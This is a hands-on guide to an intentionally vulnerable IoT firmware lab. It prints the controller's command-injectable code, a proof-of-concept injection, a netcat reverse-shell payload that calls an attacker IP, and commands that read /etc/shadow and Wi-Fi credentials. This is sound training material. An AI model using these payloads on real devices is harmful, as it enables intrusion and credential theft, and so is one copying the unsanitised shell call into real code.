# Lab Guide: smrtRelay IoT Hacking Lab

A virtualised hardware hacking lab based on a real IoT device firmware.
No physical hardware needed.

---

## 1. Start the lab

```bash
docker compose up --build -d
```

Open **http://localhost/lab** to see the split-screen view:

- **Left - Target UART:** the device debug serial console
- **Right - Attacker shell:** your machine

---

## 2. Default credentials

| What | Username | Password |
|------|----------|----------|
| Web interface (`http://localhost/`) | `admin` | `admin` |
| UART login | `root` | `tcm` |

Default credentials are one of the most common findings in real IoT assessments.

---

## 3. The UART shell

In the physical world, UART is a serial port exposed as small pads or pins on
the device PCB. You solder wires to those pads, connect a cheap USB adapter
($3), open a serial terminal and you often land directly in a root shell with
no password, or a weak one.

This is one of the first things hardware hackers look for when they open a
device. It reveals:

```bash
cat /etc/shadow              # password hashes for all users
cat /etc/wpa_supplicant.conf # WiFi credentials, often in plaintext
ls /etc/                     # config files, scripts, keys
cat /etc/passwd              # user list
```

In this lab the UART is simulated as a browser terminal. Log in with
`root` / `tcm` and explore freely.

---

## 4. The vulnerability: command injection

The web interface lets you set the device clock by calling:

```
GET /schedule?time=2025-01-01T12:00
```

Inside the controller the value is inserted directly into a shell command
with no sanitisation:

```python
# mock-controller/app.py
cmd = f'date -s "{time_val}"'
subprocess.run(cmd, shell=True)
```

`shell=True` passes the whole string to `/bin/sh -c`. If `time_val` contains
`&`, the shell interprets what follows as a second command.

**Proof of concept:**

```
http://localhost/schedule?time=bad" %26 id"
```

> `&` must be written as `%26` in the URL. A bare `&` in a query string is
> interpreted by the browser (and by HTTP) as a separator between parameters,
> so the request would be split into two parameters and the shell never sees
> the `&`. URL-encoding it as `%26` passes the literal character to the server.

Watch the UART terminal on the left: the output of `id` appears in the
controller log. You just ran an arbitrary command on the device via a GET
request.

---

## 5. What is a reverse shell?

Normally you connect **to** a target. A reverse shell flips this: the
**target connects back to you**.

```
Normal:   Attacker -----------------> Target   (needs open port on target)
Reverse:  Attacker <----------------- Target   (target connects out)
```

IoT devices are usually behind NAT or a firewall and cannot be reached
directly from outside. But they can make outbound connections. A reverse
shell exploits this by having the device call home to the attacker.

---

## 6. Exploit: reverse shell step by step

### Step 1 - Listen (Attacker shell, right pane)

```bash
nc -lvp 4444
```

Netcat opens a TCP listener on port 4444 and waits for the device to connect.

### Step 2 - Inject the payload (browser address bar)

The payload URL-encoded (use this in the browser):

```
http://localhost/schedule?time=bad%22%20%26%20nc%2010.13.61.20%204444%20-e%20/bin/bash%22
```

The same payload decoded (do NOT paste this directly in the browser, it will not be interpreted correctly):

```
http://localhost/schedule?time=bad" & nc 10.13.61.20 4444 -e /bin/bash"
```

What the injected shell command does:

| Part | Meaning |
|------|---------|
| `bad"` | Closes the `date -s "..."` argument, breaking out of it |
| `&` | Runs the next command in the background |
| `nc 10.13.61.20 4444` | Connects to the attacker machine on port 4444 |
| `-e /bin/bash` | Hands over a bash shell through that connection |

### Step 3 - You're in

The right pane receives the connection and you get a shell on the target:

```bash
$ id
uid=0(root) gid=0(root)
$ ifconfig        # shows 10.13.61.10, the target IP
$ cat /etc/shadow
$ cat /etc/wpa_supplicant.conf
```

---

## 7. IoT pentesting checklist

| Area | What to look for |
|------|-----------------|
| **Default credentials** | `admin/admin`, `root/root`, model name as password |
| **UART / serial** | Root shell, boot messages, plaintext credentials |
| **Firmware files** | Hardcoded passwords, private keys, API tokens |
| **Web interface** | Unauthenticated endpoints, missing CSRF tokens, command injection |
| **Network** | HTTP instead of HTTPS, Telnet, FTP, cleartext protocols |
| **Config files** | `/etc/wpa_supplicant.conf`, `/etc/shadow`, `/etc/passwd` |

---

> **Disclaimer:** this lab is intentionally vulnerable. Use these techniques
> only in authorised environments.
